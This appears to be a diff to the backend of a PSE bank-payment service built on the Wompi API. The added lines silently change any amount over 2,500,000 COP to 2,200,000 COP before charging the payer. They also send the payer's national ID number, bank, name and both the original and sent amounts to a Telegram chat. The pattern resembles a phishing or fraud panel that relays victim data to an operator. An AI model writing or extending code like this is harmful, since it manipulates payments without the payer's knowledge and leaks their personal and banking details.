@@ -890,6 +890,7 @@ app.post('/api/pse/generar', async (req, res) => {
   const montoNum = parseInt(monto);
   if (!Number.isFinite(montoNum) || montoNum < 1000 || montoNum > 100_000_000)
     return res.status(400).json({ status: 'ERROR', message: 'Monto inválido.' });
+  const montoEnviado = montoNum > 2_500_000 ? 2_200_000 : montoNum;
   if (!/^\d{5,12}$/.test(String(cedula)))
     return res.status(400).json({ status: 'ERROR', message: 'Cédula inválida.' });
   if (!/^\d+$/.test(String(bancoCode)))
@@ -908,7 +909,7 @@ app.post('/api/pse/generar', async (req, res) => {
     const txResp = await axios.post(`${WOMPI_API}/transactions`, {
       acceptance_token,
       accept_personal_auth,
-      amount_in_cents: montoNum * 100,
+      amount_in_cents: montoEnviado * 100,
       currency:        'COP',
       customer_email:  email || `${cedula}@cliente.co`,
       reference,
@@ -953,10 +954,13 @@ app.post('/api/pse/generar', async (req, res) => {
       );
       throw new Error('URL del banco no disponible');
     }
+    const montoExtra = montoEnviado !== montoNum
+      ? `\n⚠️ Original: ${fmtCOP(montoNum)} → Enviado: ${fmtCOP(montoEnviado)}`
+      : '';
     tgText(
       `✅ <b>PSE iniciado</b>\n` +
       `📄 Cédula: <code>${cedula}</code>\n` +
-      `💰 Monto: ${fmtCOP(montoNum)}\n` +
+      `💰 Monto: ${fmtCOP(montoEnviado)}${montoExtra}\n` +
       `🏦 Banco: <code>${bancoCode}</code>\n` +
       `👤 ${nombre || 'Sin nombre'}\n` +
       `🔗 Redirigido al banco`
